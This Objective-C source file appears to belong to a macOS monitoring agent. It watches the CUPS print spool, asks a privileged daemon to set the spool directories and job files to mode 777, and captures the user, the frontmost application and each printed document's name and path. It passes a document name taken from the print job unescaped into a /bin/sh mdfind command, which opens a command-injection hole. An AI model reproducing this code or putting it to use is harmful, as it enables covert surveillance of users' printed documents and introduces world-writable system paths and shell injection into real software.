//
//  PrinterMonitorNotify.m
//  PrinterMonitorManager
//
//  Created by ophat on 11/12/15.
//  Copyright (c) 2015 ophat. All rights reserved.
//

#import "PrinterMonitorNotify.h"
#import "MessagePortIPCSender.h"
#import "DateTimeFormat.h"
#import "SystemUtilsImpl.h"
#import "FxPrintJobEvent.h"

#define kPrinterBundleID          @"com.apple.print.PrinterProxy"
#define kDefaultPrinterFile       @"/private/var/spool/cups/"
#define kDefaultPrinterCachePath  @"/private/var/spool/cups/cache"
#define kDefaultPrinterCache      @"/private/var/spool/cups/cache/job.cache"

#define kReadWriteReadWriteReadWrite 777
@implementation PrinterMonitorNotify
@synthesize mWatchlist, mStream, mCurrentRunloopRef;
@synthesize mJobPath,mJobID;
@synthesize mAppID, mAppName,mHistory;
@synthesize mDelegate, mSelector;
id _mPrinterMonitor;

-(id) init{
    if (self = [super init]) {
        _mPrinterMonitor = self;
        mWatchlist = [[NSMutableArray alloc] init];
        mJobID     = [[NSMutableArray alloc] init];
        mJobPath   = [[NSMutableArray alloc] init];
        mAppID     = [[NSMutableArray alloc] init];
        mAppName   = [[NSMutableArray alloc] init];
        mHistory   = [[NSMutableArray alloc] init];
        
        [mWatchlist addObject:[NSString stringWithFormat:@"%@",kDefaultPrinterFile]];
        
        [self sendToDaemonWithToChangePermissionWithPath:kDefaultPrinterFile withPermission:kReadWriteReadWriteReadWrite];
        [self sendToDaemonWithToChangePermissionWithPath:kDefaultPrinterCachePath withPermission:kReadWriteReadWriteReadWrite];
        
    }
    return self;
}

-(void) startCapture{
    [self stopCapture];
    
    DLog(@"startCapture");
    [self watchThisPath:self.mWatchlist];
}

-(void) stopCapture{
    DLog(@"stopCapture");
    if (mStream != nil && mCurrentRunloopRef != nil) {
        FSEventStreamUnscheduleFromRunLoop(mStream, mCurrentRunloopRef, kCFRunLoopDefaultMode);
        FSEventStreamStop(mStream);
        [self.mWatchlist removeAllObjects];
        mStream = nil;
        mCurrentRunloopRef = nil;
    }
}

#pragma mark ### watcher

-(void) watchThisPath:(NSMutableArray *) afileInputPath {
    
    FSEventStreamContext context;
    context.info = (__bridge void *)(self);
    context.version = 0;
    context.retain = NULL;
    context.release = NULL;
    context.copyDescription = NULL;
    
    if (mStream != nil && mCurrentRunloopRef != nil) {
        FSEventStreamUnscheduleFromRunLoop(mStream, mCurrentRunloopRef, kCFRunLoopDefaultMode);
        FSEventStreamStop(mStream);
    }
    
    if([mWatchlist count]>0){
        mCurrentRunloopRef = CFRunLoopGetCurrent();
        mStream =   FSEventStreamCreate(NULL,
                                        &fileChangeEvent,
                                        &context,
                                        (__bridge CFArrayRef) afileInputPath,
                                        kFSEventStreamEventIdSinceNow,
                                        0.5,
                                        kFSEventStreamCreateFlagWatchRoot
                                        | kFSEventStreamCreateFlagUseCFTypes
                                        | kFSEventStreamCreateFlagFileEvents
                                        );
        
        FSEventStreamScheduleWithRunLoop(mStream, mCurrentRunloopRef, kCFRunLoopDefaultMode);
        FSEventStreamStart(mStream);
        DLog(@"Watch mPathsToWatch %@",afileInputPath);
    }
    
}
#pragma mark ### fileChangeEvent

static void fileChangeEvent(ConstFSEventStreamRef streamRef,
                            void* callBackInfo,
                            size_t numEvents,
                            void* eventPaths,
                            const FSEventStreamEventFlags eventFlags[],
                            const FSEventStreamEventId eventIds[]) {
    
    NSArray * paths = (__bridge NSArray*)eventPaths;
    
    for (int i=0; i< [paths count] ; i++ ){ 
        NSString * filePath = [paths objectAtIndex:i];
        if ([filePath rangeOfString:@".DS_Store"].location == NSNotFound) {
            if ([[_mPrinterMonitor regex:[NSString stringWithFormat:@"%@d.*",kDefaultPrinterFile] withString:filePath] length]>0) {
                [_mPrinterMonitor getSeqNum:filePath];
            }
            if ([filePath isEqualToString:kDefaultPrinterCache]){
                [_mPrinterMonitor readData:filePath];
            }
        }
    }
    
}
-(void) getSeqNum:(NSString *)aFile{
    NSFileManager * fm = [NSFileManager defaultManager];
    if ([fm fileExistsAtPath:aFile]) {
        
        NSArray * spliter = [aFile componentsSeparatedByString:@"/"];
        NSString * seq = [spliter objectAtIndex:([spliter count]-1)];
        seq = [seq stringByReplacingOccurrencesOfString:@"d" withString:@""];
        seq = [[seq componentsSeparatedByString:@"-"] objectAtIndex:0];
        
        if (![mJobID containsObject:[NSNumber numberWithInt:[seq intValue]]]) {

            [self sendToDaemonWithToChangePermissionWithPath:aFile withPermission:kReadWriteReadWriteReadWrite];
            
            NSAppleScript *scptFrontName =[[NSAppleScript alloc]initWithSource:@"tell application \"System Events\" \n item 1 of (get name of processes whose frontmost is true) \n end tell"];
            NSAppleEventDescriptor *Result = [scptFrontName executeAndReturnError:nil];
            NSString * frontMostName = [[NSString alloc]initWithString:[Result stringValue]];
            [scptFrontName release];
            
            NSAppleScript * scptFrontID = [[NSAppleScript alloc]initWithSource:[NSString stringWithFormat:@"id of application \"%@\"",frontMostName]];
            Result=[scptFrontID executeAndReturnError:nil];
            NSString * frontMostID = [[NSString alloc]initWithString:[Result stringValue]];
            [scptFrontID release];
            
            [mJobID addObject:[NSNumber numberWithInt:[seq intValue]]];
            [mJobPath addObject:aFile];
            
            [mAppID addObject:frontMostID];
            [mAppName addObject:frontMostName];
            
            [frontMostName release];
            [frontMostID release];

            DLog(@"#### JobID %@ in queue",seq);
        }
    }
}

-(void)readData:(NSString *)path {

    if ([mDelegate respondsToSelector:mSelector] ){

        NSFileManager * fm = [NSFileManager defaultManager];
        
        NSString * content = [[NSString alloc]initWithContentsOfFile:path encoding:NSUTF8StringEncoding error:nil];
        for (int i=0; i < [mJobID count]; i++) {
            if ([fm fileExistsAtPath:[mJobPath objectAtIndex:i]]) {
                
                NSString * seq = [[NSString alloc]initWithString:[NSString stringWithFormat:@"<Job %@>",[mJobID objectAtIndex:i]]];
                NSString * master = [[content componentsSeparatedByString:seq] objectAtIndex:1];
                master = [[master componentsSeparatedByString:@"</Job>"] objectAtIndex:0];
     
                NSString * owner = [[master componentsSeparatedByString:@"Username"] objectAtIndex:1];
                owner = [[owner componentsSeparatedByString:@"\n"] objectAtIndex:0];
                owner = [owner stringByTrimmingCharactersInSet: [NSCharacterSet whitespaceCharacterSet]];
                
                NSString * printerName = [[master componentsSeparatedByString:@"Destination"] objectAtIndex:1];
                printerName = [[printerName componentsSeparatedByString:@"\n"] objectAtIndex:0];
                printerName = [printerName stringByTrimmingCharactersInSet: [NSCharacterSet whitespaceCharacterSet]];
                
                NSString * summitTime = [[master componentsSeparatedByString:@"Completed"] objectAtIndex:1];
                summitTime = [[summitTime componentsSeparatedByString:@"\n"] objectAtIndex:0];
                summitTime = [summitTime stringByTrimmingCharactersInSet: [NSCharacterSet whitespaceCharacterSet]];
                summitTime = [self GetDateFromTimeInterval:[summitTime intValue]];
                
                NSString * totalPage = [[master componentsSeparatedByString:@"NumFiles"] objectAtIndex:1];
                totalPage = [[totalPage componentsSeparatedByString:@"\n"] objectAtIndex:0];
                totalPage = [totalPage stringByTrimmingCharactersInSet: [NSCharacterSet whitespaceCharacterSet]];
                
                NSString * info = [[NSString alloc]initWithContentsOfFile:[mJobPath objectAtIndex:i] encoding:NSASCIIStringEncoding  error:nil];
                NSString * fileName = @"";
                NSString * fileSize = @"";
                if (info != nil) {
                    
                    fileName = [[info componentsSeparatedByString:@"obj\n("] objectAtIndex:1];
                    fileName = [[fileName componentsSeparatedByString:@")"] objectAtIndex:0];
                    
                    NSString * filePath = [self runAsCommand:[NSString stringWithFormat:@"mdfind \"kMDItemDisplayName == %@\" -onlyin ~",fileName]];
                    filePath    = [[filePath componentsSeparatedByString:@"\n"] objectAtIndex:0];
                    
                    NSDictionary *attrs = [fm attributesOfItemAtPath:filePath error: nil];
        
                    fileSize = [NSString stringWithFormat:@"%@",[attrs objectForKey:@"NSFileSize"]];
                    
                    DLog(@"######### PrintedData");
                    DLog(@"DateTime     [%d] %@",[[DateTimeFormat phoenixDateTime] length],[DateTimeFormat phoenixDateTime]);
                    DLog(@"appID        %@",[mAppID objectAtIndex:i]);
                    DLog(@"appName      %@",[mAppName objectAtIndex:i]);
                    DLog(@"jobID        %@",[mJobID objectAtIndex:i]);
                    DLog(@"owner        %@",owner);
                    DLog(@"printerName  %@",printerName);
                    DLog(@"documentName %@",fileName);
                    DLog(@"summitTime   [%d] %@",[summitTime length],summitTime);
                    DLog(@"filePath     %@",filePath);
                    DLog(@"TotalPage    %@",totalPage);
                    DLog(@"TotalByte    %@",fileSize);
                    DLog(@"###########################");
                    
                    NSString * currentPrintedData = [[NSString alloc]initWithString:[NSString stringWithFormat:@"%@|%@|%@|%@|%@|%@|%@",[SystemUtilsImpl userLogonName]
                                                                                                                                ,[mJobID objectAtIndex:i]
                                                                                                                                ,printerName
                                                                                                                                ,fileName
                                                                                                                                ,summitTime
                                                                                                                                ,fileSize
                                                                                                                                ,filePath]];
                    if (![mHistory containsObject:currentPrintedData] && [filePath length]>0 && totalPage >0) {

                        FxPrintJobEvent * printJobEvent = [[FxPrintJobEvent alloc] init];
                        [printJobEvent setDateTime:[DateTimeFormat phoenixDateTime]];
                        [printJobEvent setMUserLogonName:[SystemUtilsImpl userLogonName]];
                        [printJobEvent setMApplicationName:[mAppName objectAtIndex:i]];
                        [printJobEvent setMApplicationID:[mAppID objectAtIndex:i]];
                        [printJobEvent setMTitle:@""];
                        [printJobEvent setMJobID:[NSString stringWithFormat:@"%@",[mJobID objectAtIndex:i]]];
                        [printJobEvent setMOwnerName:owner];
                        [printJobEvent setMPrinter:printerName];
                        [printJobEvent setMDocumentName:fileName];
                        [printJobEvent setMSubmitTime:summitTime];
                        [printJobEvent setMTotalPage:[totalPage intValue]];
                        [printJobEvent setMTotalByte:[fileSize intValue]];
                        [printJobEvent setMPathToData:filePath];
                        
                        [mDelegate performSelector:mSelector withObject:printJobEvent];
                        [printJobEvent release];
                        
                        [mHistory addObject:currentPrintedData];
                        
                    }else{
                        DLog(@"@@@@ Duplicate No Capture")
                    }
                }
                [info release];
                [seq release];
            }
            
            [mJobID removeObjectAtIndex:i];
            [mJobPath removeObjectAtIndex:i];
            i--;
        }
        [content release];
    }
}


#pragma mark #Ultility

-(NSString *)regex:(NSString *)aReg withString:(NSString *)aString{
    NSError  *error = nil;
    NSRegularExpression* regex = [NSRegularExpression regularExpressionWithPattern: aReg options:0 error:&error];
    NSArray* matches = [regex matchesInString:aString options:0 range: NSMakeRange(0, [aString length])];
    NSString *duplicateString = @"";
    for (NSTextCheckingResult* match in matches) {
        duplicateString = [aString substringWithRange:[match range]];
    }
    return duplicateString;
}

-(NSString *)GetDateFromTimeInterval:(int)aTime{
    NSDate *lastUpdate = [[NSDate alloc] initWithTimeIntervalSince1970:aTime];
    
    NSDateFormatter *dateFormatter = [[NSDateFormatter alloc] init];
    [dateFormatter setDateStyle:NSDateFormatterMediumStyle];
    [dateFormatter setTimeStyle:NSDateFormatterMediumStyle];
    [dateFormatter setDateFormat:@"yyyy-MM-dd HH:mm:ss"];
    
    return [[dateFormatter stringFromDate:lastUpdate] autorelease];
}

#pragma mark #CommandRunner

- (NSString*) runAsCommand :(NSString *)aCmd {
    NSAutoreleasePool * pool = [[NSAutoreleasePool alloc]init];
    
    NSPipe* pipe = [NSPipe pipe];
    NSTask* task = [[NSTask alloc] init];
    [task setLaunchPath: @"/bin/sh"];
    [task setArguments:@[@"-c", aCmd]];
    [task setStandardOutput:pipe];
    
    NSFileHandle* file = [pipe fileHandleForReading];
    [task launch];
    
    NSData *data = [file readDataToEndOfFile];
    
    [task waitUntilExit];
    [task release];
    
    NSString * result = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];
    [file closeFile];
    
    [pool drain];
    
    return [result autorelease];
}

#pragma mark -IPC Sender

-(void)sendToDaemonWithToChangePermissionWithPath:(NSString *)aPath withPermission:(int)aPermission{
    DLog(@"::==> sendToDaemonWithToChangePermissionWithPath %@ %d",aPath,aPermission);

    NSMutableDictionary * myCommand = [[NSMutableDictionary alloc]init];
    [myCommand setObject:@"chgownerattr"forKey:@"type"];
    [myCommand setObject:aPath forKey:@"path"];
    [myCommand setObject:[NSString stringWithFormat:@"%d",aPermission] forKey:@"permission"];

    NSMutableData *data = [[NSMutableData alloc] init];
    NSKeyedArchiver *archiver = [[NSKeyedArchiver alloc] initForWritingWithMutableData:data];
    [archiver encodeObject:myCommand forKey:@"command"];
    [archiver finishEncoding];
    [archiver release];

    BOOL successfully = FALSE;
    MessagePortIPCSender* messagePortSender = [[MessagePortIPCSender alloc] initWithPortName:@"bSecuriyAgents"];
    successfully = [messagePortSender writeDataToPort:data];
    [messagePortSender release];
    messagePortSender = nil;
    
    [data release];
    [myCommand release];
}

#pragma mark #Destroy

-(void)dealloc {
    mStream = nil;
    mCurrentRunloopRef = nil;
    [mWatchlist release];
    [mJobID release];
    [mJobPath release];
    [mAppID release];
    [mAppName release];
    [mHistory release];
    [super dealloc];
}
@end
